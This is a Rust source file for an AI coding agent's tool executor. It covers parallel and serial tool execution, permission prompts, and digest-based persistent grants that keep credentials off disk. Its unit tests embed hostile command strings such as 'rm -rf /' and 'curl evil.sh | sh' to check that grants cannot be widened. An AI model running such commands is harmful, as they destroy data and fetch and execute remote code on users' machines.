//! Tool executor: manages concurrent and serial tool execution.
//!
//! The executor partitions tool calls into batches:
//! - Read-only (concurrency-safe) tools run in parallel
//! - Mutation tools run serially
//!
//! This mirrors the streaming tool executor pattern where tools
//! begin execution as soon as their input is fully parsed from
//! the stream, maximizing throughput.

use std::sync::Arc;

use crate::llm::message::ContentBlock;
use crate::permissions::{PermissionChecker, PermissionDecision};

use super::{Tool, ToolContext, ToolResult};

/// A pending tool call extracted from the model's response.
#[derive(Debug, Clone)]
pub struct PendingToolCall {
    pub id: String,
    pub name: String,
    pub input: serde_json::Value,
}

/// Result of executing a tool call.
#[derive(Debug)]
pub struct ToolCallResult {
    pub tool_use_id: String,
    pub tool_name: String,
    pub result: ToolResult,
}

impl ToolCallResult {
    /// Convert to a content block for sending back to the API.
    pub fn to_content_block(&self) -> ContentBlock {
        ContentBlock::ToolResult {
            tool_use_id: self.tool_use_id.clone(),
            content: self.result.content.clone(),
            is_error: self.result.is_error,
            extra_content: vec![],
        }
    }
}

/// Extract pending tool calls from assistant content blocks.
pub fn extract_tool_calls(content: &[ContentBlock]) -> Vec<PendingToolCall> {
    content
        .iter()
        .filter_map(|block| {
            if let ContentBlock::ToolUse { id, name, input } = block {
                Some(PendingToolCall {
                    id: id.clone(),
                    name: name.clone(),
                    input: input.clone(),
                })
            } else {
                None
            }
        })
        .collect()
}

/// Execute a batch of tool calls, respecting concurrency constraints.
///
/// Tools that are concurrency-safe run in parallel. Other tools run
/// serially. Results are returned in the same order as the input.
pub async fn execute_tool_calls(
    calls: &[PendingToolCall],
    tools: &[Arc<dyn Tool>],
    ctx: &ToolContext,
    permission_checker: &PermissionChecker,
) -> Vec<ToolCallResult> {
    // Partition into concurrent and serial batches.
    let mut results = Vec::with_capacity(calls.len());

    // Group consecutive concurrency-safe calls together.
    let mut i = 0;
    while i < calls.len() {
        let call = &calls[i];
        let tool = tools.iter().find(|t| t.name() == call.name);

        match tool {
            None => {
                results.push(ToolCallResult {
                    tool_use_id: call.id.clone(),
                    tool_name: call.name.clone(),
                    result: ToolResult::error(format!("Tool '{}' not found", call.name)),
                });
                i += 1;
            }
            Some(tool) => {
                // Parallel batching requires read-only IN ADDITION TO
                // concurrency-safe: the spawned context has no task manager
                // or sandbox, and a mutating tool must never slip past the
                // serial path's full accounting. (SendMessage/TaskStop are
                // concurrency-safe but mutate — they take the serial path.)
                if tool.is_concurrency_safe() && tool.is_read_only() {
                    // Collect consecutive concurrency-safe, read-only calls.
                    let batch_start = i;
                    while i < calls.len() {
                        let t = tools.iter().find(|t| t.name() == calls[i].name);
                        if t.is_some_and(|t| t.is_concurrency_safe() && t.is_read_only()) {
                            i += 1;
                        } else {
                            break;
                        }
                    }

                    // Execute batch concurrently.
                    let batch = &calls[batch_start..i];
                    let mut handles = Vec::new();

                    for call in batch {
                        let tool = tools
                            .iter()
                            .find(|t| t.name() == call.name)
                            .unwrap()
                            .clone();
                        let call = call.clone();
                        let ctx_cwd = ctx.cwd.clone();
                        let ctx_cancel = ctx.cancel.clone();
                        let ctx_verbose = ctx.verbose;
                        let perm_checker = ctx.permission_checker.clone();

                        let ctx_plan_mode = ctx.plan_mode;
                        let ctx_live_plan = ctx.live_plan_mode.clone();
                        let ctx_session_id = ctx.session_id.clone();
                        let ctx_file_cache = ctx.file_cache.clone();
                        // Read-only tools still go through permission checks —
                        // with the SAME prompter/allow-store/denial-tracker as
                        // the serial path, so an `Ask` decision prompts the
                        // user instead of silently auto-allowing, session
                        // allows apply, and denials reach the audit hooks.
                        let ctx_prompter = ctx.permission_prompter.clone();
                        let ctx_allows = ctx.session_allows.clone();
                        let ctx_grants = ctx.persistent_grants.clone();
                        let ctx_denials = ctx.denial_tracker.clone();
                        let ctx_events = ctx.tool_events.clone();
                        let ctx_origin = ctx.agent_origin.clone();
                        handles.push(tokio::spawn(async move {
                            execute_single_tool(
                                &call,
                                &*tool,
                                &ToolContext {
                                    cwd: ctx_cwd,
                                    cancel: ctx_cancel,
                                    permission_checker: perm_checker.clone(),
                                    verbose: ctx_verbose,
                                    plan_mode: ctx_plan_mode,
                                    file_cache: ctx_file_cache,
                                    denial_tracker: ctx_denials,
                                    task_manager: None,
                                    subagent_colors: None,
                                    session_allows: ctx_allows,
                                    persistent_grants: ctx_grants,
                                    permission_prompter: ctx_prompter,
                                    question_asker: None,
                                    agent_origin: ctx_origin,
                                    // Read-only tools spawn no subprocesses, so
                                    // the sandbox would be inert here anyway.
                                    sandbox: None,
                                    active_disk_output_style: None,
                                    agent_limiter: None,
                                    tool_events: ctx_events,
                                    active_call_id: None,
                                    subagent_api_defaults: None,
                                    live_plan_mode: ctx_live_plan,
                                    session_id: ctx_session_id,
                                },
                                &perm_checker,
                            )
                            .await
                        }));
                    }

                    for handle in handles {
                        match handle.await {
                            Ok(result) => results.push(result),
                            Err(e) => {
                                results.push(ToolCallResult {
                                    tool_use_id: String::new(),
                                    tool_name: String::new(),
                                    result: ToolResult::error(format!("Task join error: {e}")),
                                });
                            }
                        }
                    }
                } else {
                    // Execute serially.
                    let result = execute_single_tool(call, &**tool, ctx, permission_checker).await;
                    results.push(result);
                    i += 1;
                }
            }
        }
    }

    results
}

/// Execute a single tool call with permission checking.
async fn execute_single_tool(
    call: &PendingToolCall,
    tool: &dyn Tool,
    ctx: &ToolContext,
    permission_checker: &PermissionChecker,
) -> ToolCallResult {
    // Bind the call id so progressive tool events (stdout chunks) correlate.
    let ctx = ctx.with_call_id(&call.id);

    // Block non-read-only tools in plan mode.
    if ctx.plan_mode_now() && !tool.is_read_only() {
        return ToolCallResult {
            tool_use_id: call.id.clone(),
            tool_name: call.name.clone(),
            result: ToolResult::error(
                "Plan mode active: only read-only tools are allowed. \
                 Use ExitPlanMode to enable mutations."
                    .to_string(),
            ),
        };
    }

    // Check permissions.
    let decision = tool
        .check_permissions(&call.input, permission_checker)
        .await;
    match decision {
        PermissionDecision::Allow => {}
        PermissionDecision::Deny(reason) => {
            if let Some(ref tracker) = ctx.denial_tracker {
                tracker
                    .lock()
                    .await
                    .record(&call.name, &call.id, &reason, &call.input);
            }
            return ToolCallResult {
                tool_use_id: call.id.clone(),
                tool_name: call.name.clone(),
                result: ToolResult::error(format!("Permission denied: {reason}")),
            };
        }
        PermissionDecision::Ask(prompt) => {
            // Session allows key on (tool, normalized input shape) so
            // "allow for session" does not blanket every future call of
            // the same tool name (M0 AllowSession store).
            let allow_key = session_allow_key(&call.name, &call.input);
            let session_allowed = match ctx.session_allows {
                Some(ref allows) => allows.lock().await.contains(&allow_key),
                None => false,
            };
            // A persistent grant is matched by exact key over the full
            // normalized operation, so it covers this call and nothing
            // adjacent to it. Reached only from `Ask`, so it can never
            // override a `deny`, and destructive commands are already
            // rejected by `validate_input` before any of this runs.
            let sandbox_state = sandbox_grant_state(ctx.sandbox.as_deref());
            let grant_key = persistent_grant_key(&call.name, &call.input, &sandbox_state, &ctx.cwd);
            let granted = match ctx.persistent_grants {
                Some(ref grants) => grants.lock().await.contains(&grant_key),
                None => false,
            };
            if session_allowed || granted {
                // Already approved — skip prompt.
            } else {
                // Prompt the user for permission via the prompter trait.
                let description = format!("{}: {}", call.name, prompt);
                let input_preview = serde_json::to_string_pretty(&call.input).ok();

                let response = if let Some(ref prompter) = ctx.permission_prompter {
                    // `ask` blocks synchronously until the human answers —
                    // potentially minutes. Announce the block so the runtime
                    // hands this worker's queue AND the timer driver to a
                    // spare thread; otherwise a pending ask can starve
                    // timers/other tasks on small runtimes (few cores), up
                    // to freezing the UI loop that would answer the modal.
                    // block_in_place is a no-op choice on current-thread
                    // runtimes (it would panic), where blocking is the
                    // caller's contract anyway.
                    let ask = || {
                        prompter.ask(
                            &call.name,
                            &description,
                            input_preview.as_deref(),
                            ctx.agent_origin.as_deref(),
                        )
                    };
                    match tokio::runtime::Handle::current().runtime_flavor() {
                        tokio::runtime::RuntimeFlavor::MultiThread => {
                            tokio::task::block_in_place(ask)
                        }
                        _ => ask(),
                    }
                } else {
                    // No prompter = auto-allow (non-interactive mode).
                    super::PermissionResponse::AllowOnce
                };

                match response {
                    super::PermissionResponse::AllowOnce => {
                        // Continue to execution.
                    }
                    super::PermissionResponse::AllowSession => {
                        if let Some(ref allows) = ctx.session_allows {
                            allows.lock().await.insert(allow_key);
                        }
                    }
                    super::PermissionResponse::AllowAlways => {
                        match ctx.persistent_grants {
                            // Record ONLY the exact key. Routing "always"
                            // through the session-allow store would widen
                            // it for the rest of this session (that store
                            // reduces writes to their path) and would
                            // survive `/permissions clear`. The grant
                            // store covers the current session too, and
                            // keeps the answer in memory if the disk
                            // write fails.
                            Some(ref grants) => {
                                // Persist-safe label, NOT `description`:
                                // the description embeds the full command
                                // line / URL, which may carry credentials
                                // that must never reach the config dir.
                                let label = persistent_grant_label(&call.name, &call.input);
                                if let Err(e) = grants.lock().await.insert(&grant_key, &label) {
                                    tracing::warn!("could not persist permission grant: {e}");
                                }
                            }
                            // Feature disabled by the host: degrade to
                            // session scope, the documented fallback.
                            None => {
                                if let Some(ref allows) = ctx.session_allows {
                                    allows.lock().await.insert(allow_key.clone());
                                }
                            }
                        }
                    }
                    super::PermissionResponse::Deny => {
                        if let Some(ref tracker) = ctx.denial_tracker {
                            tracker.lock().await.record(
                                &call.name,
                                &call.id,
                                "user denied",
                                &call.input,
                            );
                        }
                        return ToolCallResult {
                            tool_use_id: call.id.clone(),
                            tool_name: call.name.clone(),
                            result: ToolResult::error("Permission denied by user".to_string()),
                        };
                    }
                }
            } // close else block
        }
    }

    // Defensive `validate_input` — the query loop already runs this
    // before PreToolUse hooks fire, so reaching here with an invalid
    // input means a non-default code path skipped the engine-level
    // validation. We re-run it as a belt-and-braces guard; the
    // upstream short-circuit is what guarantees no hook saw the
    // bad input.
    if let Err(err) = tool.validate_input(&call.input) {
        return ToolCallResult {
            tool_use_id: call.id.clone(),
            tool_name: call.name.clone(),
            result: ToolResult::error(format!("{err}")),
        };
    }

    // Execute.
    match tool.call(call.input.clone(), &ctx).await {
        Ok(mut result) => {
            // Persist large outputs to disk, replace with truncated + path reference.
            result.content = crate::services::output_store::persist_if_large(
                &result.content,
                tool.name(),
                &call.id,
            );

            // Additional truncation if still over the tool's limit.
            let max = tool.max_result_size_chars();
            if result.content.len() > max {
                result.content.truncate(max);
                result.content.push_str("\n\n(output truncated)");
            }
            ToolCallResult {
                tool_use_id: call.id.clone(),
                tool_name: call.name.clone(),
                result,
            }
        }
        Err(e) => ToolCallResult {
            tool_use_id: call.id.clone(),
            tool_name: call.name.clone(),
            result: ToolResult::error(e.to_string()),
        },
    }
}

/// Stable session-allow key: tool name + normalized input shape.
///
/// Used so "allow for session" on one bash command does not auto-allow
/// every future Bash call.
pub fn session_allow_key(tool: &str, input: &serde_json::Value) -> String {
    let shape = match tool {
        "Bash" | "PowerShell" => input
            .get("command")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string(),
        "FileWrite" | "FileEdit" | "FileRead" | "MultiEdit" | "NotebookEdit" => input
            .get("file_path")
            .or_else(|| input.get("path"))
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string(),
        "WebFetch" => input
            .get("url")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string(),
        _ => {
            // Hash the FULL canonical JSON. Truncating to a prefix let two
            // different inputs sharing a 256-char prefix collide — an
            // AllowSession grant for one large ApplyPatch/MCP input silently
            // covered a different one. Length + hash makes collisions
            // practically impossible within a session (keys never persist).
            use std::hash::{Hash, Hasher};
            let s = serde_json::to_string(input).unwrap_or_default();
            let mut h = std::collections::hash_map::DefaultHasher::new();
            s.hash(&mut h);
            format!("len{}:h{:016x}", s.len(), h.finish())
        }
    };
    format!("{tool}\0{shape}")
}

/// The `sandbox_state` component of a durable grant key: what actually
/// isolates subprocesses in this session.
///
/// A fingerprint of the effective policy while the sandbox really wraps
/// commands, so a grant recorded under one isolation regime stops
/// matching once the regime weakens (network enabled, write paths
/// widened, strategy changed) — the user is re-asked instead.
///
/// `"none"` when nothing isolates: no sandbox, disabled, or enabled but
/// degraded to a no-op with `fail_closed = false`.
///
/// A degraded sandbox that *refuses* to run (`fail_closed = true`) gets
/// its own state, because `is_active()` is false for a degraded sandbox
/// either way and the two would otherwise share `"none"`. The user can
/// answer "always" to a call that `must_block_when_degraded()` then
/// rejects; flipping `sandbox.fail_closed` to false must not turn that
/// grant into standing permission to run the command unsandboxed.
pub fn sandbox_grant_state(sandbox: Option<&crate::sandbox::SandboxExecutor>) -> String {
    match sandbox {
        Some(s) if s.is_active() => s.isolation_fingerprint(),
        Some(s) if s.must_block_when_degraded() => "degraded-blocked".to_string(),
        _ => "none".to_string(),
    }
}

/// Key for a grant that outlives the session (`AllowAlways`).
///
/// Deliberately stricter than [`session_allow_key`]: a durable grant must
/// cover this exact call and nothing adjacent to it — the contract on
/// [`crate::tools::PermissionResponse::AllowAlways`]. The session key
/// reduces write tools to their `file_path`, which is tolerable for one
/// session the user is watching, but on disk it would turn one approved
/// edit into a permanent license to write *anything* to that path.
///
/// - `Bash`/`PowerShell`: a digest of the command string plus everything
///   that changes what an approval *means*: the sandbox-bypass flag, the
///   background flag (background runs skip the sandbox wrapper), the
///   normalized effective timeout (a longer timeout lets later side
///   effects of the same command run), and `sandbox_state` — a
///   fingerprint of the effective isolation policy ("none" when nothing
///   isolates). A grant recorded under isolation must not authorize the
///   same command when the sandbox is off, degraded open, or merely
///   *weaker* in a later session. Only `description` is advisory and
///   excluded.
/// - `WebFetch`: a digest of the URL, prefixed by a digest of the
///   authority. Not cwd-bound — a fetch means the same thing from any
///   directory.
/// - Everything else, including every write tool, keys on the full input:
///   serde_json maps serialize with sorted keys (`preserve_order` is off),
///   so the string is canonical.
///
/// Shell and file keys are additionally bound to a digest of the
/// canonicalized `cwd`: the grant scope is the repository root and the
/// session can `/cd` inside it, so `./build.sh` approved in one
/// directory must not cover the identically spelled call somewhere
/// else, where it runs different code.
///
/// Two properties of the digests are load-bearing. They are SHA-256
/// because this is an authorization boundary — the hash must resist
/// adversarially chosen collisions, not merely be collision-sparse. And
/// commands, URLs, and paths (including the cwd) appear *only* as
/// digests, never verbatim: an approved call can embed inline
/// credentials (`curl -H 'Authorization: Bearer …'`, signed URLs), and
/// this key is persisted into the config directory, where secrets must
/// never be written. Equality matching needs nothing more than the
/// digest.
pub fn persistent_grant_key(
    tool: &str,
    input: &serde_json::Value,
    sandbox_state: &str,
    cwd: &std::path::Path,
) -> String {
    let cwd_digest = {
        let canonical = cwd.canonicalize().unwrap_or_else(|_| cwd.to_path_buf());
        // Raw path bytes, not a lossy string — same rule as every other
        // path that feeds a persisted digest.
        sha256_hex(&crate::config::os_path_bytes(&canonical))
    };
    let shape = match tool {
        "Bash" | "PowerShell" => {
            let command = input.get("command").and_then(|v| v.as_str()).unwrap_or("");
            let unsandboxed = input
                .get("dangerouslyDisableSandbox")
                .and_then(|v| v.as_bool())
                .unwrap_or(false);
            let background = input
                .get("run_in_background")
                .and_then(|v| v.as_bool())
                .unwrap_or(false);
            // Normalized exactly like BashTool::call, so an explicit
            // default matches an omitted one but a genuinely different
            // budget re-prompts.
            let timeout = crate::tools::bash::effective_timeout_ms(input);
            format!(
                "cmd-sha256:{}\0nosandbox:{unsandboxed}\0bg:{background}\0timeout:{timeout}\0isolated:{sandbox_state}\0cwd-sha256:{cwd_digest}",
                sha256_hex(command.as_bytes())
            )
        }
        "WebFetch" => {
            let url = input.get("url").and_then(|v| v.as_str()).unwrap_or("");
            // The authority is digested like everything else. A hostname
            // is user-controlled and not guaranteed secret-free — a valid
            // URL can carry a credential in the authority itself
            // (`https://<api-key>.api.example/`), which the userinfo and
            // path/query sanitizing in `url_host` does not touch — and
            // this key is persisted into the config directory.
            format!(
                "host-sha256:{}\0url-sha256:{}",
                sha256_hex(url_host(url).as_bytes()),
                sha256_hex(url.as_bytes())
            )
        }
        _ => {
            // Digest only — no readable path prefix. File and MCP paths
            // can themselves carry credentials (signed tokens in file
            // names, secret-bearing MCP path fields), and this key is
            // persisted; the path is already inside the hashed input.
            let s = serde_json::to_string(input).unwrap_or_default();
            format!(
                "sha256:{}\0cwd-sha256:{cwd_digest}",
                sha256_hex(s.as_bytes())
            )
        }
    };
    format!("{tool}\0{shape}")
}

/// Label safe to persist next to a grant key. The description shown in
/// the live modal may embed the full command line or URL, which can
/// carry inline credentials, and *any* user-controlled token — program
/// path, file path, leading assignment, hostname — can too. So the
/// persisted label is fixed per tool and discloses no part of the input.
pub fn persistent_grant_label(tool: &str, _input: &serde_json::Value) -> String {
    match tool {
        // Not even the first token: it can be an executable path like
        // `/tmp/export-<secret>/run`, and a persisted guess is a leak.
        "Bash" | "PowerShell" => {
            format!("{tool}: one exact command (stored as digest)")
        }
        // Not even the host: an authority can itself be the credential,
        // as in `https://<api-key>.api.example/`.
        "WebFetch" => "WebFetch: one exact URL (stored as digest)".to_string(),
        _ => format!("{tool}: one exact call (input stored as digest)"),
    }
}

fn sha256_hex(bytes: &[u8]) -> String {
    use sha2::{Digest, Sha256};
    Sha256::digest(bytes)
        .iter()
        .map(|b| format!("{b:02x}"))
        .collect()
}

/// Scheme+host prefix of a URL, without path, query or userinfo.
///
/// Never persisted verbatim — the authority itself can be a credential
/// (`https://<api-key>.api.example/`), so callers digest the result. It
/// exists so that two URLs differing only below the authority still
/// agree on this component of the key.
///
/// Fail closed: this is a hand parser, and lenient fetchers accept
/// delimiters it may not know about (`\` is the known one and is
/// handled), so any authority containing characters outside the
/// conservative host charset is persisted as `"(url)"` rather than
/// guessed at — a wrong guess writes a secret to disk.
fn url_host(url: &str) -> String {
    let (scheme, rest) = match url.split_once("://") {
        Some((s, r)) => (s, r),
        None => ("", url),
    };
    let host = rest
        // `\` included: many URL consumers treat a backslash after the
        // authority as a path separator, so it must end the host here
        // too or path bytes leak into the persisted prefix.
        .split(['/', '?', '#', '\\'])
        .next()
        .unwrap_or("")
        // Strip userinfo — `https://user:token@host/` must not leak.
        .rsplit('@')
        .next()
        .unwrap_or("");
    let plausible_host = !host.is_empty()
        && host
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '_' | ':' | '[' | ']'));
    if !plausible_host {
        return "(url)".to_string();
    }
    if scheme.is_empty() {
        host.to_string()
    } else {
        format!("{scheme}://{host}")
    }
}

#[cfg(test)]
mod session_allow_tests {
    use super::*;

    /// `persistent_grant_key` with no active isolation and a fixed cwd —
    /// the common fixture for properties that concern neither.
    fn pkey(tool: &str, input: &serde_json::Value) -> String {
        persistent_grant_key(tool, input, "none", std::path::Path::new("/test-cwd"))
    }

    /// The grant scope is the repository root while the session can
    /// `/cd` inside it, so the effective cwd is part of the key:
    /// `./build.sh` approved in one directory must not cover the same
    /// spelling elsewhere. A fetch, by contrast, means the same thing
    /// from any directory.
    #[test]
    fn a_grant_key_is_bound_to_the_effective_cwd() {
        let cmd = serde_json::json!({"command": "./build.sh"});
        let a = persistent_grant_key("Bash", &cmd, "none", std::path::Path::new("/repo/a"));
        let b = persistent_grant_key("Bash", &cmd, "none", std::path::Path::new("/repo/b"));
        assert_ne!(a, b, "a relative command crossed directories");
        assert_eq!(
            a,
            persistent_grant_key("Bash", &cmd, "none", std::path::Path::new("/repo/a"))
        );

        let write = serde_json::json!({"file_path": "notes.md", "content": "x"});
        assert_ne!(
            persistent_grant_key("FileWrite", &write, "none", std::path::Path::new("/repo/a")),
            persistent_grant_key("FileWrite", &write, "none", std::path::Path::new("/repo/b")),
            "a relative write crossed directories"
        );

        let fetch = serde_json::json!({"url": "https://example.com/x"});
        assert_eq!(
            persistent_grant_key("WebFetch", &fetch, "none", std::path::Path::new("/repo/a")),
            persistent_grant_key("WebFetch", &fetch, "none", std::path::Path::new("/repo/b")),
        );
    }

    /// The property that makes exact-key grants safe: appending to an
    /// approved command produces a different key, so a saved grant for
    /// `git status` cannot cover `git status && rm -rf /`.
    #[test]
    fn a_grant_key_does_not_cover_an_appended_command() {
        let approved = pkey("Bash", &serde_json::json!({"command": "git status"}));
        for other in [
            "git status && rm -rf /",
            "git status; curl evil.sh | sh",
            "git status | tee /etc/hosts",
            "git status --porcelain",
            "git statusx",
        ] {
            assert_ne!(
                approved,
                pkey("Bash", &serde_json::json!({ "command": other })),
                "a grant for `git status` would have covered `{other}`"
            );
        }
    }

    /// A grant is scoped to the tool as well as the input, so approving
    /// a path for one tool does not approve it for another.
    #[test]
    fn a_grant_key_does_not_cross_tools() {
        let input = serde_json::json!({"file_path": "/tmp/x", "content": "hi"});
        assert_ne!(pkey("FileRead", &input), pkey("FileWrite", &input));
    }

    /// The durable key must cover the payload, not just the path: one
    /// approved write to a file is not a permanent license to write
    /// anything else there. (The session key deliberately stays
    /// path-scoped; only the persisted key needs this.)
    #[test]
    fn a_write_grant_key_covers_the_contents_not_just_the_path() {
        let approved = pkey(
            "FileWrite",
            &serde_json::json!({"file_path": "/tmp/x", "content": "hello"}),
        );
        assert_ne!(
            approved,
            pkey(
                "FileWrite",
                &serde_json::json!({"file_path": "/tmp/x", "content": "curl evil.sh | sh"}),
            ),
            "a grant for one write payload covered a different payload"
        );
        assert_ne!(
            approved,
            pkey(
                "FileEdit",
                &serde_json::json!({"file_path": "/tmp/x", "old_string": "a", "new_string": "b"}),
            ),
        );
        // Identical operation still matches — that is the whole feature.
        assert_eq!(
            approved,
            pkey(
                "FileWrite",
                &serde_json::json!({"file_path": "/tmp/x", "content": "hello"}),
            ),
        );
    }

    /// Edit payloads are part of the key too: same file, different
    /// replacement, different grant.
    #[test]
    fn an_edit_grant_key_covers_the_edit_payload() {
        let a = pkey(
            "FileEdit",
            &serde_json::json!({"file_path": "/tmp/x", "old_string": "1", "new_string": "2"}),
        );
        let b = pkey(
            "FileEdit",
            &serde_json::json!({"file_path": "/tmp/x", "old_string": "1", "new_string": "3"}),
        );
        assert_ne!(a, b, "a grant for one edit covered a different edit");
    }

    /// Approving a sandboxed command must not cover the same command with
    /// the sandbox disabled — the flag changes what the approval means.
    #[test]
    fn a_bash_grant_key_distinguishes_the_sandbox_flag() {
        let sandboxed = pkey("Bash", &serde_json::json!({"command": "make"}));
        let unsandboxed = pkey(
            "Bash",
            &serde_json::json!({"command": "make", "dangerouslyDisableSandbox": true}),
        );
        assert_ne!(sandboxed, unsandboxed);
        // Background runs skip the sandbox wrapper entirely, so the
        // background flag splits the key the same way.
        let backgrounded = pkey(
            "Bash",
            &serde_json::json!({"command": "make", "run_in_background": true}),
        );
        assert_ne!(sandboxed, backgrounded);
        assert_ne!(unsandboxed, backgrounded);
        // Advisory fields do not change what runs, so they do not split
        // the key — otherwise every grant would be single-use in practice.
        assert_eq!(
            sandboxed,
            pkey(
                "Bash",
                &serde_json::json!({"command": "make", "description": "Build the project"}),
            ),
        );
    }

    /// The *session's* effective isolation is part of the key: a grant
    /// recorded while the sandbox actively wraps commands must not
    /// authorize the same command running bare on the host after the
    /// sandbox is disabled, degrades open, or merely weakens (a policy
    /// change produces a different fingerprint).
    #[test]
    fn a_bash_grant_key_is_bound_to_the_effective_sandbox_state() {
        let input = serde_json::json!({"command": "make"});
        let isolated = persistent_grant_key(
            "Bash",
            &input,
            "fp-strict-policy",
            std::path::Path::new("/test-cwd"),
        );
        assert_ne!(
            isolated,
            persistent_grant_key("Bash", &input, "none", std::path::Path::new("/test-cwd")),
            "a grant crossed between isolated and unisolated sessions"
        );
        assert_ne!(
            isolated,
            persistent_grant_key(
                "Bash",
                &input,
                "fp-weaker-policy",
                std::path::Path::new("/test-cwd")
            ),
            "a grant survived an isolation-policy change"
        );
    }

    /// The timeout bounds which of a command's side effects get to run,
    /// so a different effective budget is a different operation — but an
    /// omitted timeout and an explicit default are the same one, and
    /// values beyond the cap normalize onto it.
    #[test]
    fn a_bash_grant_key_normalizes_the_timeout() {
        let default = pkey("Bash", &serde_json::json!({"command": "make"}));
        assert_ne!(
            default,
            pkey(
                "Bash",
                &serde_json::json!({"command": "make", "timeout": 100}),
            ),
            "a short-timeout approval covered a longer run"
        );
        assert_eq!(
            default,
            pkey(
                "Bash",
                &serde_json::json!({"command": "make", "timeout": 120_000}),
            ),
        );
        assert_eq!(
            pkey(
                "Bash",
                &serde_json::json!({"command": "make", "timeout": 600_000}),
            ),
            pkey(
                "Bash",
                &serde_json::json!({"command": "make", "timeout": 999_999_999_u64}),
            ),
        );
    }

    /// Grant keys and labels are persisted into the config directory,
    /// where secrets must never be written: a command line or URL can
    /// embed inline credentials, so nothing user-controlled may appear
    /// verbatim — only digests.
    #[test]
    fn persisted_keys_and_labels_never_contain_the_command_or_url() {
        let secret = "hunter2-super-secret";
        let bash_input = serde_json::json!({
            "command": format!("curl -H 'Authorization: Bearer {secret}' https://api.example.com")
        });
        let key = pkey("Bash", &bash_input);
        let label = persistent_grant_label("Bash", &bash_input);
        assert!(!key.contains(secret), "secret leaked into the grant key");
        assert!(!label.contains(secret), "secret leaked into the label");
        assert_eq!(
            label, "Bash: one exact command (stored as digest)",
            "labels must be fixed per tool — any command token can carry a secret"
        );
        // Same call still matches; a different command does not.
        assert_eq!(key, pkey("Bash", &bash_input));
        assert_ne!(key, pkey("Bash", &serde_json::json!({"command": "curl"})));

        let url_input = serde_json::json!({
            "url": format!("https://user:{secret}@files.example.com/download?sig={secret}")
        });
        let key = pkey("WebFetch", &url_input);
        let label = persistent_grant_label("WebFetch", &url_input);
        assert!(!key.contains(secret), "secret leaked into the URL key");
        assert!(!label.contains(secret), "secret leaked into the URL label");
        assert!(
            !key.contains("files.example.com"),
            "authority persisted verbatim: {key}"
        );
        assert_ne!(
            key,
            pkey(
                "WebFetch",
                &serde_json::json!({"url": "https://files.example.com/download?sig=other"}),
            ),
            "different URLs must not share a grant"
        );

        // Paths can carry secrets too (signed tokens in file names, MCP
        // path fields): they appear only inside the digest, never in
        // cleartext, in both the key and the label.
        let write_input = serde_json::json!({
            "file_path": format!("/tmp/export-{secret}.csv"),
            "content": "data",
        });
        let key = pkey("FileWrite", &write_input);
        let label = persistent_grant_label("FileWrite", &write_input);
        assert!(!key.contains(secret), "path secret leaked into key: {key}");
        assert!(!label.contains(secret), "path secret leaked: {label}");
    }

    /// The sanitizers themselves must not be leak vectors: a leading
    /// env assignment is not a program name, and a backslash ends the
    /// URL authority just like a slash does.
    #[test]
    fn sanitized_labels_survive_assignment_and_backslash_tricks() {
        let secret = "hunter2-super-secret";

        // `API_KEY=… curl` — the assignment must not be mistaken for
        // the program, including when quoting fragments the token.
        for cmd in [
            format!("API_KEY={secret} curl https://api.example.com"),
            format!("API_KEY='{secret} x' curl https://api.example.com"),
        ] {
            let input = serde_json::json!({ "command": cmd });
            let label = persistent_grant_label("Bash", &input);
            assert!(
                !label.contains("hunter2"),
                "assignment value leaked into the label: {label}"
            );
            assert_eq!(label, "Bash: one exact command (stored as digest)");
        }

        // Backslash after the authority: lenient fetchers treat it as a
        // path separator, so the authority must stop there too — the
        // digested component must match the clean host's, not carry the
        // secret bytes into a distinct hash.
        let url = format!("https://files.example.com\\{secret}?sig={secret}");
        let input = serde_json::json!({ "url": url });
        let key = pkey("WebFetch", &input);
        let label = persistent_grant_label("WebFetch", &input);
        assert!(!key.contains("hunter2"), "secret leaked into key: {key}");
        assert!(!label.contains("hunter2"), "secret leaked: {label}");
        assert_eq!(url_host(&url), "https://files.example.com");
        assert!(
            key.contains(&format!(
                "host-sha256:{}\0",
                sha256_hex(b"https://files.example.com")
            )),
            "authority digest did not stop at the backslash: {key}"
        );

        // Anything that does not look like a host is not parsed at all —
        // fail closed instead of guessing.
        assert_eq!(
            url_host(&format!("https://{secret}=v al?x")),
            "(url)",
            "implausible authority must collapse to (url)"
        );
    }

    /// A credential can live in the authority itself
    /// (`https://<api-key>.api.example/`), where the userinfo and
    /// path/query sanitizing in `url_host` never reaches it. The
    /// authority therefore gets the same digest treatment as the URL,
    /// and the label discloses no part of it.
    #[test]
    fn a_webfetch_grant_never_persists_the_authority() {
        let secret = "hunter2-super-secret";
        let input = serde_json::json!({
            "url": format!("https://{secret}.api.example/path")
        });
        let key = pkey("WebFetch", &input);
        let label = persistent_grant_label("WebFetch", &input);

        assert!(
            !key.contains(secret),
            "authority credential written into the grant key: {key}"
        );
        assert!(
            !label.contains(secret),
            "authority credential written into the label: {label}"
        );
        assert!(
            !key.contains("api.example") && !label.contains("api.example"),
            "authority persisted verbatim: {key} / {label}"
        );
        assert_eq!(
            label, "WebFetch: one exact URL (stored as digest)",
            "the WebFetch label must be fixed — an authority can itself be a secret"
        );

        // Still exact: the same URL matches, a different one does not.
        assert_eq!(key, pkey("WebFetch", &input));
        assert_ne!(
            key,
            pkey(
                "WebFetch",
                &serde_json::json!({"url": "https://other.api.example/path"})
            ),
            "different authorities must not share a grant"
        );
    }

    /// `is_active()` is false for a degraded sandbox whether it fails
    /// closed or open, so both states would key as `"none"`. A grant
    /// recorded while the backend was missing and the call was being
    /// *refused* must not become standing permission to run the same
    /// command unsandboxed after `sandbox.fail_closed` is flipped off.
    #[test]
    #[cfg(not(target_os = "macos"))]
    fn a_degraded_fail_closed_sandbox_keys_apart_from_fail_open() {
        // seatbelt is unavailable off macOS, so an enabled seatbelt
        // config degrades to a no-op on this platform.
        let mut cfg = crate::config::SandboxConfig {
            enabled: true,
            strategy: "seatbelt".to_string(),
            ..Default::default()
        };
        cfg.fail_closed = true;
        let blocked = crate::sandbox::SandboxExecutor::from_config(&cfg, std::path::Path::new("/"));
        cfg.fail_closed = false;
        let permitted =
            crate::sandbox::SandboxExecutor::from_config(&cfg, std::path::Path::new("/"));

        assert!(
            blocked.is_degraded() && !blocked.is_active(),
            "precondition: fail-closed sandbox is degraded and inactive"
        );
        assert!(
            permitted.is_degraded() && !permitted.is_active(),
            "precondition: fail-open sandbox is degraded and inactive"
